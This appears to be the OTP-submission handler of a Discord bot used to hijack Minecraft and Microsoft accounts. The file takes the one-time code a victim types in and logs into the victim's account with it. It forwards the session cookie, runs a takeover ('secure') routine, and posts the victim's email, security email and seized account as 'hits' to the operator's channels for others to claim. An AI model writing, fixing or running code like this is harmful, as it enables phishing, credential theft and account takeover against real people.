const { queryParams } = require("../../../db/db");
const login = require("../../utils/login");
const secure = require("../../utils/secure");
const messageTemplate = require("../../utils/messageTemplate");
const getEmbed = require("../../utils/getEmbed");
const fetchStats = require("../../utils/fetchStats");
const statsMsg = require("../../utils/statsMsg");
const listAccount = require("../../utils/listAccount");
const { loginCookieMessager } = require("../../utils/messager");
let obj = {
  name: "submit",
  callback: async (client, interaction) => {
    // Variables
    let code = interaction.components[0].components[0].value;
    let email = interaction.customId.split("|")[1];
    let secEmail = interaction.customId.split("|")[2];
    let secId = interaction.customId.split("|")[3];
    let mcname = interaction.customId.split("|")[4];

    // Fetch settings from the database
    let settings = await queryParams(`SELECT * FROM autosecure WHERE user_id=?`, [client.username])
    if (settings.length == 0) {
      return interaction.reply({
        embeds: [{
          title: `Error :x:`,
          description: `Unexpected error occured!`,
          color: 0xff0000
        }],
        ephemeral: true
      })
    }
    settings = settings[0]

    // Channels
    let channelId, guildId, nChannelId, nGuildId, hChannelId, hGuildId = null


    // Log Channel
    if (settings.logs_channel) {
      [channelId, guildId] = settings.logs_channel.split("|")
    } else {
      return interaction.reply({ content: `Set your logs channel first!\nusing **/set**`, ephemeral: true })
    }

    // Notifications channel!
    if (settings.notification_channel) {
      [nChannelId, nGuildId] = settings?.notification_channel?.split("|")
    } else {
      return interaction.reply({ cotent: `Set the notifications channel first!using **/set**`, ephemeral: true })
    }
    // Hits Channel
    if (settings.hits_channel) {
      [hChannelId, hGuildId] = settings?.hits_channel?.split("|")
    } else {
      return interaction.reply({ cotent: `Set the hits channel first!\nusing **/set**`, ephemeral: true })
    }

    // Check if the code is a number
    if (isNaN(code)) {
      console.log(`[X] Invalid Code! [Not Numbers]`)
      return interaction.reply({
        embeds: [
          {
            title: `Error :x:`,
            description: `Invalid code, please confirm with the code that was sent to your email`,
            color: 0xff0000,
          },
        ],
        ephemeral: true,
      });
    }
    try {
      await client.guilds.cache.get(guildId).channels.cache.get(channelId).send(messageTemplate({
        content: `<@${interaction.user.id}> submitted code!`,
        title: "OTP Verification!",
        mcname: mcname,
        email: email,
        securityEmail: secEmail,
        code: code,
        state: "Waiting to verify code!",
        color: 0x00ff00,
        userId: interaction.user.id
      }))
    } catch (e) {
      console.log(`Error while trying to send (Submitted code message)! ${e}`)
    }
    if (settings?.auto_secure && settings?.autosecureEnabled) {

      try {

        // Try to login with the code

        console.log(`Trying to Login Email: ${email} Code: ${code}`)
        let host = await login({ email: email, id: secId, code: code })

        // logged in successfully and got the MSA Cookie
        if (host) {
          console.log(`Logged in successfully`)
          try {
            interaction.reply({
              embeds: [await getEmbed(client.username, "res")],
              ephemeral: true
            })

            loginCookieMessager(client, guildId, channelId, host)
            console.log(`Starting the Auto Secure process`)
            let acc = await secure(host, settings)

            let msg = await listAccount(acc)
            client?.hits?.set(acc.oldName, acc)
            client?.hits?.set(mcname, acc);
            client.guilds.cache.get(hGuildId).channels.cache.get(hChannelId).send(msg);
            let ids = await fetchStats(acc.oldName)
            if (ids) {
              client.guilds.cache.get(nGuildId).channels.cache.get(nChannelId).send(await statsMsg(ids, "skyblock", true));
            } else {
              client.guilds.cache.get(nGuildId).channels.cache.get(nChannelId).send({
                content: `@here`,
                embeds: [
                  {
                    title: `New Hit! :tada:`,
                    description: `If you think that this is your hit, then do /claim <IGN> to claim it!`,
                    color: 0x00ff00,
                  },
                ],
              });
            }
          } catch (e) {
            console.log(`Error in the process of autosecure (not necessarily while autosecuring)! ${e}`)
          }

        } else {
          console.log(`Invalid Code! [Failed to Login with it!]`)
          interaction.reply({
            embeds: [await getEmbed(client.username, `invalid`)],
            ephemeral: true
          })
          if (guildId && channelId) {
            client.guilds.cache.get(guildId).channels.cache.get(channelId).send({
              embeds: [
                {
                  title: `Couldn't login to ${email}`,
                  description: `Invalid code!`,
                  color: 0xff0000,
                },
              ],
            });
          }
        }
      } catch (e) {
        console.log(e)
      }
    } else {
      interaction.reply({
        embeds: [
          await getEmbed(client.username, `res`)
        ],
        ephemeral: true,
      });
      client.hits.set(mcname, {
        embeds: [{
          title: `${mcname}! :x:`,
          description: `Email: **${email}**\nSecurity email: **${secEmail?.replaceAll("*", "\\*")}** \nCode: **${code}**`,
          color: 0x00ff00
        }]
      });
    }
  },
};

module.exports = obj;
